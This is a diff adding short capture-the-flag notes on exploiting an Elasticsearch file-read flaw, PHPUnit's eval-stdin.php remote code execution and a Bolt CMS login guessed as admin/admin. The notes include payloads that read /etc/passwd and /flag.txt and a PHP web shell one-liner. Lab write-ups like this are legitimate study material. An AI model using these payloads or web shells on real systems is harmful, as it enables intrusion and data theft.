@@ -37,6 +37,20 @@ there is a vulnerabilty we can find using searchsploit elasticsearch
 CVE-2015-5531- Arbitrary file Vulnerability. 
 https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
 exploit.py ip /etc/passwd
+php-unit
+using dirsearch we can find vulnerable files dirsearch.py -u ip -w ./db/dicc.txt
+phpunit/phpunit: 5.6.2 has vulnerabilty
+using burp send request to /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+using command we can retrieve the flag <?php system('cat /flag.txt')?>
+bolt
+/bolt/login
+guess password admin admin
+we can upload file but to run php command it has to be uploaded using another format
+access cmd with <?php echo system($_GET['cmd']);?> command
+cmd=cat%20/flag.txt
+flag
+
+
 
 
 
